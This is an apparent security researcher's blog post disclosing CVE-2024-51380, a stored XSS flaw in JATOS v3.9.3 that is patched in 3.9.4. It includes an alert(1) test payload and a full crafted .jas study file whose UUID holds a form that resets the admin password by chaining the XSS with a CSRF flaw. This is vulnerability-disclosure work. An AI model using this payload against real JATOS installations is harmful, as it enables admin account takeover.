=== Content from hacking-notes.medium.com_6fb8d7f1_20250115_093334.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F44aea338ee9c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51380-jatos-v3-9-3-stored-xss-properties-component-44aea338ee9c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51380-jatos-v3-9-3-stored-xss-properties-component-44aea338ee9c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2024–51380 | JATOS v3.9.3 Stored XSS | Properties Component

[![Hacking Notes](https://miro.medium.com/v2/resize:fill:88:88/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---byline--44aea338ee9c--------------------------------)

[Hacking Notes](/?source=post_page---byline--44aea338ee9c--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F6c4ceca25a3b&operation=register&redirect=https%3A%2F%2Fhacking-notes.medium.com%2Fcve-2024-51380-jatos-v3-9-3-stored-xss-properties-component-44aea338ee9c&user=Hacking+Notes&userId=6c4ceca25a3b&source=post_page-6c4ceca25a3b--byline--44aea338ee9c---------------------post_header-----------)

4 min read·Nov 5, 2024

--

Listen

Share

![]()
# Introduction to CVE CVE-2024–51380

CVE-2024–51380 highlights a critical security vulnerability within the application that poses significant risks to user data and system integrity. This Stored XSS (Cross-Site Scripting) flaw enables an attacker to execute JavaScript in a user’s browser, leading to unauthorized actions and account takeover.

# What is JATOS

[JATOS](https://github.com/JATOS/JATOS) is a powerful web-based platform designed to conduct psychological experiments and surveys online. It enables researchers to create, distribute, and gather data from participants in a controlled environment, making it a versatile tool in the field of psychological research.

The platform boasts a user-friendly interface that allows researchers to set up experiments without requiring extensive programming knowledge, making it accessible to a broader audience. Additionally, JATOS supports multi-platform usage, enabling experiments to be run on various devices, including computers, tablets, and smartphones, which significantly expands participant reach.

One of the standout features of JATOS is its real-time data collection capability, which allows researchers to gather and analyze results efficiently. It also offers integration with other tools and platforms, providing flexibility in experimental design. As an open-source software, JATOS allows researchers to customize the platform according to their specific needs, further enhancing its utility.

JATOS was developed by [**Kristian Lange**](https://github.com/kristian-lange) and [**Elisa Filevich**](https://github.com/elisafilevich), who aimed to create an effective solution for online research. Speaking with Kristian, he made me understand that he is currently the only developer still maintaining JATOS. This is particularly impressive given the extensive capabilities of the platform and the demands of ongoing development and support. It’s an amazing achievement for a solo developer to sustain such a robust and widely used tool in the research community.

*I want to highlight that, thanks to the excellent collaboration with Kristian, the issues identified in this blog article have been successfully patched in version 3.9.4.*

# Exploitation Phase

Now that you clearly understand what JATOS is, let’s delve deeper into the specifics of this CVE and explore how an attacker might exploit it. We will begin by demonstrating a straightforward vulnerability and then illustrate a relevant use case in which an attacker could leverage this vulnerability against an administrator to gain elevated privileges.

## Simple Exploitation

To exploit the Stored XSS vulnerability in the properties component of the study section, an attacker can export a study, modify the `.jas` file to include `<script>alert(1)</script>` in the first UUID section, and then re-import the study. When the properties section is accessed, the JavaScript will be executed. This is particularly concerning because if a study containing such a payload is assigned to an admin, the admin may inadvertently execute JavaScript crafted by a user in their browser.

![]()![]()

A strong recommendation to address this issue is to implement a check within the `.jas` file to ensure that HTML and JavaScript tags are not present in disallowed areas.

## Attacker Scenario Exploiting the Vulnerability

This vulnerability could be exploited in conjunction with **CVE #4 | JATOS v3.9.3 CSRF | Admin Password Rese**t, enabling a regular user to reset an admin password.

To exploit this vulnerability, the user would first create a new study within the application. After setting up the study, they would export the corresponding `.jas` file. Next, the user would modify this file to embed a malicious JavaScript snippet inside the UUID. Once the modifications are complete, the user would re-import the study back into the application. Afterward, they would assign the study to an administrator. Finally, when the admin clicks on the properties section of the study, the embedded JavaScript executes, potentially compromising the system.

```
{"version":"3","data":{"uuid":"<form action='http://localhost.com:9000/jatos/user/passwordByAdmin' method='POST'><input type='hidden' name='newPassword' value='adminnewpassword123'><input type='hidden' name='username' value='admin'><button type='submit'>Submit</button></form>","title":"testing","description":"","groupStudy":false,"linearStudy":false,"allowPreview":true,"dirName":"admin","comments":"","jsonData":null,"endRedirectUrl":"","studyEntryMsg":"hi guys","componentList":[],"batchList":[{"uuid":"12345","title":"Default","active":true,"maxActiveMembers":null,"maxTotalMembers":null,"maxTotalWorkers":null,"allowedWorkerTypes":["PersonalSingle","Jatos","PersonalMultiple"],"comments":null,"jsonData":null}]}}
```

When the administrator clicks on the description section of this study, a CSRF attack is triggered to change the admin password, effectively granting the attacker administrative privileges.

![]()

This enables the attacker to log into the admin account, compromising the integrity, confidentiality, and availability of the application, especially if any studies are deleted.

# Related CVE References

* [CVE-2024–51379 | JATOS v3.9.3 Stored XSS | Description Component](https://medium.com/p/de49d0077a96)
* [CVE-2024–51381 | JATOS v3.9.3 CSRF | Admin Account Creation](https://medium.com/p/94035f24d0be)
* [CVE-2024–51382 | JATOS v3.9.3 CSRF | Admin Password Reset](https://medium.com/p/1adeff0386ed)
# Other References

For the latest updates on my developments and research, be sure to check out my [**GitHub profile**](https://github.com/Hacking-Notes).

--

--

[![Hacking Notes](https://miro.medium.com/v2/resize:fill:96:96/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---post_author_info--44aea338ee9c--------------------------------)[![Hacking Notes](https://miro.medium.com/v2/resize:fill:128:128/1*PNPZJB45mzMTgwk3wiUglQ.jpeg)](/?source=post_page---post_author_info--44aea338ee9c--------------------------------)Follow[## Written by Hacking Notes](/?source=post_page---post_author_info--44aea338ee9c--------------------------------)[10 Followers](/followers?source=post_page---post_author_info--44aea338ee9c--------------------------------)·[3 Following](/following?source=post_page---post_author_info--44aea338ee9c--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----44aea338ee9c--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----44aea338ee9c--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----44aea338ee9c--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----44aea338ee9c--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----44aea338ee9c--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----44aea338ee9c--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----44aea338ee9c--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----44aea338ee9c--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----44aea338ee9c--------------------------------)[Teams](https://medium.com/business?source=post_page-----44aea338ee9c--------------------------------)


